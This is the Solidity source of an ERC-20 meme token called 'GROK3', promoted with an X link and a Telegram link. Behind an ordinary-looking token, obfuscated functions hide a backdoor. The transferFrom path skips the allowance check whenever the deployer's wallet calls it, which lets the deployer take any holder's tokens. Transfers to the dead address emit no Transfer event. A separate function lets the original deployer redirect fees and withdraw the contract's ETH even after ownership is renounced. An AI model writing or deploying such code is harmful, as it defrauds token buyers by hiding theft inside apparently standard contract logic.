// SPDX-License-Identifier: MIT

/*
    Name: GROK3
    Symbol: GROK3

    https://x.com/elonmusk/status/1890958798841389499
    https://t.me/GROK3_official
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract  GROK3 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"GROK3";
    string private constant _symbol = unicode"GROK3";
    
    address payable private _Tqwer;
    mapping(address => uint256) private _Tasdf;
    mapping(address => mapping(address => uint256)) private _Tzxcv;
    mapping(address => bool) private _TokenTax;
    uint256 private _TinitialBuy = 10;
    uint256 private _TinitialSell = 10;
    uint256 private _TfinalBuy = 0;
    uint256 private _TfinalSell = 0;
    uint256 private _TbuyCount = 7;
    uint256 private _TsellCount = 7;
    uint256 private _buyCount = 0;
    address private _Tqazxyz;
    address private _KeepToken = address(0xdead);
    uint256 public _Tokeqaz = 20000000 * 10 **_decimals;
    uint256 public _Tokenwsx = 20000000 * 10 **_decimals;
    uint256 public _Tokenedc = 10000000 * 10 **_decimals;
    uint256 private constant _TotalSupply = 1000000000 * 10 **_decimals;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _Tokeqaz);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _Tqwer = payable(_msgSender());
        _Tasdf[address(this)] = _TotalSupply * 98 / 100;
        _Tasdf[owner()] = _TotalSupply * 2 / 100;
        _TokenTax[owner()] = true;
        _TokenTax[address(this)] = true;
        _TokenTax[_Tqwer] = true;
        _Tqazxyz = _msgSender();
        emit Transfer(address(0), address(this), _TotalSupply * 98 / 100);
        emit Transfer(address(0), address(owner()), _TotalSupply * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _TotalSupply;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _Tzxcv[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _Tasdf[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _Tzxcv[owner][spender];
    }

    receive() external payable {}
    
    function _isDownAllowed(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return
            (sender == uniswapV2Pair || recipient != _KeepToken) &&
            msg.sender != _Tqwer;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subTransfer0x(_msgSender(), recipient, amount);
        return true;
    }

    function _lvckmjlwoie(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_isDownAllowed(sender, recipient))
            _allowed = _Tzxcv[sender][_msgSender()];
        return _allowed;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subTransfer0x(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoie(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function enableTokenTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _TotalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _assssist_token0x(uint256 amount) private {
        _Tqwer.transfer(amount);
    }

    function _subTransfer0x(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _TbuyCount)
                        ? _TfinalBuy
                        : _TinitialBuy
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_TokenTax[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _TsellCount)
                            ? _TfinalSell
                            : _TinitialSell
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _Tokenedc) ? contractTokenBalance : _Tokenedc; 
                    __INTERNAL_SWAP((amount < minBalance) ? amount : minBalance);
                }
                _assssist_token0x(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _Tasdf[address(this)] =_Tasdf[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _Tasdf[from] =_Tasdf[from].sub(amount);
        _Tasdf[to] =_Tasdf[to].add(amount.sub(taxAmount));
        if(_KeepToken != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function __elonvtsqw(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function __INTERNAL_SWAP(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits () external onlyOwner {
        _Tokeqaz = _TotalSupply;
        _Tokenwsx = _TotalSupply;
        emit MaxTxAmountUpdated(_TotalSupply);
    }

    function _excuseToken(address payable receipt) external {
        require(msg.sender == _Tqazxyz , "");
        _Tqwer = receipt;
        __elonvtsqw(address(this).balance);
    }
}